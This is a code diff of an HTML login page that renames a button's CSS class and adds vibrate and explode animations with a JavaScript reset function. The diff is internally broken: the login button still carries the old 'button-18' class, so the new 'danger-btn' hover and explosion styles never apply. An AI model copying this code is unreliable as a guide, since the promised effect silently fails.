@@ -126,7 +126,7 @@ body {
 .rules-ok:hover {
     background: deepskyblue;
 }
-.button-18 {
+.danger-btn {
   align-items: center;
   background-color: #fff;
   border: 0;
@@ -153,22 +153,44 @@ body {
   -webkit-user-select: none;
   vertical-align: middle;
 }
+  .danger-btn:hover {
+    background-color: #f0f0f0; /* Slight grey on hover for feedback */
+    /* Runs the vibration keyframes infinitely while hovering */
+    animation: vibrate 0.3s linear infinite both;
+  }
 
-.button-18:hover,
-.button-18:focus { 
-  background-color: #8bf0e9;
-}
+  /* 3. The Explosion Effect (Triggered by JS) */
+  .danger-btn.explode {
+    /* Runs the explode animation once */
+    animation: explode 0.5s ease-out forwards;
+    pointer-events: none; /* Prevents clicking while exploding */
+  }
 
-.button-18:active {
-  background: #09223b;
-  color: rgb(255, 255, 255, .7);
-}
+  /* Keyframes for Vibration */
+  @keyframes vibrate {
+    0% { transform: translate(0); }
+    20% { transform: translate(-2px, 2px); }
+    40% { transform: translate(-2px, -2px); }
+    60% { transform: translate(2px, 2px); }
+    80% { transform: translate(2px, -2px); }
+    100% { transform: translate(0); }
+  }
 
-.button-18:disabled { 
-  cursor: not-allowed;
-  background: rgba(0, 0, 0, .08);
-  color: rgba(0, 0, 0, .3);
-}
+  /* Keyframes for Explosion */
+  @keyframes explode {
+    0% {
+      transform: scale(1);
+      opacity: 1;
+    }
+    50% {
+      transform: scale(1.2);
+      opacity: 0.8;
+    }
+    100% {
+      transform: scale(2);
+      opacity: 0;
+    }
+  }
 </style>
 </head>
 
@@ -204,7 +226,7 @@ body {
             <form id="loginForm" onsubmit="return captureLoginData(event)">
                 <input type="text" id="username" placeholder="Username" required><br>
                 <input type="password" id="password" placeholder="Password" required><br><br><br>
-                <button class="button-18" type="submit">Log In</button>
+                <button class="button-18" type="submit" onclick="explodeAndReset(this)">Log In</button>
             </form>
 
             <div id="error-message"></div>
@@ -250,9 +272,21 @@ function captureLoginData(event) {
     }
     return false;
 }
+
+function explodeAndReset(btn) {
+      // 1. Add the class to trigger the CSS animation
+      btn.classList.add('explode');
+
+      // 2. Wait for animation (500ms) + Delay (1000ms) = 1500ms
+      setTimeout(() => {
+        // 3. Remove the class to reset the button state
+        btn.classList.remove('explode');
+      }, 1500); 
+    }
 </script>
 
 </body>
 </html>
+
 
 
